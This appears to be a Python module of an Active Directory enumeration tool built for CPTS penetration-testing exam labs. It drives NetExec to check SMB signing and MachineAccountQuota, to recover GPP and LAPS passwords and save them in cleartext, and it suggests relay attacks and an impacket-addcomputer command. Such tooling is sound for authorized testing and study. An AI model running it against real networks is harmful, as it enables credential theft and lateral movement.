#!/usr/bin/env python3
"""
CPTS-focused security checks for ADE — SMB signing, MachineAccountQuota,
GPP/LAPS credential recovery, and other exam-critical misconfigurations.
"""

import re

from termcolor import colored

from .config import SECTION_ART, get_output_path, ensure_output_parent
from .utils import print_status, print_header, run_command


def smb_signing(r: str, u: str = "", p: str = "") -> None:
    """
    Check whether SMB signing is required on the target.

    SMB signing status is a critical finding for CPTS exams:
    - If signing is disabled or not required, relay attacks (NTLM relay,
      SMB relay with Responder/ntlmrelayx) are viable.
    - If signing is required, relay attacks against SMB are blocked.

    Args:
        r: Target IP address
        u: Username (empty for anonymous check)
        p: Password (empty for anonymous check)
    """
    print_header(SECTION_ART["smb_signing"])

    if u and p:
        auth_opts = ["-u", u, "-p", p]
        label = "Check SMB signing (authenticated)"
    else:
        auth_opts = ["-u", "", "-p", ""]
        label = "Check SMB signing (anonymous)"

    output, rc = run_command(
        ["nxc", "smb", r] + auth_opts + ["-M", "smb_signing"],
        label,
        capture_output=True,
    )

    if not output or not output.strip():
        print_status("[!] Could not retrieve SMB signing status.")
        return

    output_lower = output.lower()

    # Interpret signing status
    if "signing: true" in output_lower:
        if "signing required" in output_lower:
            print_status(
                colored(
                    "[+] SMB signing is REQUIRED — relay attacks against SMB are blocked.",
                    "red",
                )
            )
        else:
            print_status(
                colored(
                    "[!] SMB signing is ENABLED but not required — relay attacks may still work.",
                    "yellow",
                )
            )
    elif "signing: false" in output_lower:
        print_status(
            colored(
                "[+] SMB signing is DISABLED — relay attacks are viable! "
                "Run Responder + ntlmrelayx.",
                "green",
            )
        )
    else:
        print_status("[!] Could not parse SMB signing status from output.")
        print_status(f"    Raw: {output[:300]}")


def machine_account_quota(r: str, u: str, p: str, d: str, k: bool = False) -> None:
    """
    Check the MachineAccountQuota (ms-DS-MachineAccountQuota) attribute.

    If non-zero, any authenticated user can create machine accounts, which
    enables Resource-Based Constrained Delegation (RBCD) attacks and other
    AD escalation paths. This is a high-value check for CPTS exams.

    Args:
        r: Target IP address
        u: Username (must be authenticated)
        p: Password
        d: Domain name
        k: Whether Kerberos auth is in use
    """
    print_header(SECTION_ART["machine_account_quota"])

    if not u or not p:
        print_status(
            "[!] MachineAccountQuota check requires credentials — skipping."
        )
        return

    kerberos_opts = ["-k"] if k else []

    output, rc = run_command(
        ["nxc", "ldap", r, "-u", u, "-p", p] + kerberos_opts + ["-M", "maq"],
        "Check MachineAccountQuota (MAQ)",
        capture_output=True,
    )

    if not output or not output.strip():
        print_status("[!] Could not retrieve MachineAccountQuota.")
        return

    output_lower = output.lower()

    if "machineaccountquota" in output_lower:
        # Try to extract the numeric value
        maq_match = re.search(
            r"MachineAccountQuota[:\s]*(\d+)", output, re.IGNORECASE
        )
        if maq_match:
            quota = int(maq_match.group(1))
            if quota == 0:
                print_status(
                    colored(
                        f"[!] MachineAccountQuota = {quota} — cannot add machine accounts.",
                        "red",
                    )
                )
            else:
                print_status(
                    colored(
                        f"[+] MachineAccountQuota = {quota} — you CAN add machine accounts!",
                        "green",
                    )
                )
                print_status(
                    colored(
                        "    → RBCD / shadow credentials attacks are viable.",
                        "yellow",
                    )
                )
                print_status(
                    colored(
                        f"    → impacket-addcomputer -dc-ip {r} -computer-pass 'Passw0rd!' '{d}/{u}:{p}'",
                        "yellow",
                    )
                )
        else:
            print_status("[+] MachineAccountQuota attribute found (see output).")
            print_status(f"    {output[:300]}")
    else:
        print_status("[!] Unexpected MAQ output format.")
        print_status(f"    Raw: {output[:300]}")


def _parse_gpp_output(output: str, module: str) -> list:
    """Extract recovered cleartext password(s) from gpp_password/gpp_autologin output."""
    results = []

    if module == "gpp_password":
        # nxc prints: "Password: <cleartext>" for each cpassword it decrypts.
        for match in re.finditer(r"Password:\s*(\S.*)", output):
            results.append(match.group(1).strip())
    elif module == "gpp_autologin":
        # nxc prints a single line: "Passwords: ['pw1', 'pw2']"
        for match in re.finditer(r"Passwords:\s*(\[.*\])", output):
            for pw in re.findall(r"'([^']*)'", match.group(1)):
                if pw:
                    results.append(pw)

    return results


def gpp_passwords(r: str, u: str = "", p: str = "") -> dict:
    """
    Check for Group Policy Preferences (GPP) cached credentials in SYSVOL.

    GPP cpassword values (Groups.xml, Services.xml, ScheduledTasks.xml, etc.)
    and cached autologon credentials (Registry.xml) are encrypted with a
    publicly known AES key and trivially reversible — a classic, fast CPTS
    exam win that only needs SYSVOL read access (often available anonymously).

    Args:
        r: Target IP address
        u: Username (empty for anonymous check)
        p: Password (empty for anonymous check)

    Returns:
        dict: {"found": bool, "count": int, "path": str|None}
    """
    print_header(SECTION_ART["gpp"])

    if u and p:
        auth_opts = ["-u", u, "-p", p]
        label_suffix = "authenticated"
    else:
        auth_opts = ["-u", "", "-p", ""]
        label_suffix = "anonymous"

    findings = []

    for module in ("gpp_password", "gpp_autologin"):
        output, rc = run_command(
            ["nxc", "smb", r] + auth_opts + ["-M", module],
            f"Check for GPP cached credentials ({module}, {label_suffix})",
            capture_output=True,
        )
        if output:
            findings.extend(_parse_gpp_output(output, module))

    if not findings:
        print_status("[!] No GPP credentials recovered.")
        return {"found": False, "count": 0, "path": None}

    path = get_output_path("gpp_passwords.txt")
    try:
        ensure_output_parent(path)
        with open(path, "w", encoding="utf-8") as f:
            f.write("\n".join(findings) + "\n")
        print_status(
            colored(
                f"[+] Recovered {len(findings)} GPP credential(s) — saved to {path}",
                "green",
            )
        )
    except Exception as e:
        print_status(f"[-] Failed to save GPP credentials to {path}: {e}")

    return {"found": True, "count": len(findings), "path": path}


def laps_readable(r: str, u: str, p: str, d: str, k: bool = False) -> dict:
    """
    Check whether the current credentials can read LAPS local admin passwords.

    If any computer's LAPS password is readable, that's an immediate local
    admin credential for lateral movement — a high-value, fast CPTS finding.

    Args:
        r: Target IP address
        u: Username (must be authenticated)
        p: Password
        d: Domain name
        k: Whether Kerberos auth is in use

    Returns:
        dict: {"found": bool, "count": int, "path": str|None}
    """
    print_header(SECTION_ART["laps"])

    if not u or not p:
        print_status("[!] LAPS check requires credentials — skipping.")
        return {"found": False, "count": 0, "path": None}

    kerberos_opts = ["-k"] if k else []

    output, rc = run_command(
        ["nxc", "ldap", r, "-u", u, "-p", p] + kerberos_opts + ["-M", "laps"],
        "Check LAPS password readability",
        capture_output=True,
    )

    if not output or not output.strip():
        print_status("[!] Could not retrieve LAPS status.")
        return {"found": False, "count": 0, "path": None}

    entries = re.findall(r"Computer:(\S+)\s+User:(\S*)\s*Password:(\S+)", output)

    if not entries:
        print_status("[!] No LAPS passwords readable with current credentials.")
        return {"found": False, "count": 0, "path": None}

    path = get_output_path("laps_passwords.txt")
    try:
        ensure_output_parent(path)
        with open(path, "w", encoding="utf-8") as f:
            for computer, _user, password in entries:
                f.write(f"{computer}:{password}\n")
        print_status(
            colored(
                f"[+] Recovered {len(entries)} LAPS password(s) — saved to {path}",
                "green",
            )
        )
        for computer, _user, password in entries:
            print_status(colored(f"    → {computer}: {password}", "green"))
    except Exception as e:
        print_status(f"[-] Failed to save LAPS passwords to {path}: {e}")

    return {"found": True, "count": len(entries), "path": path}
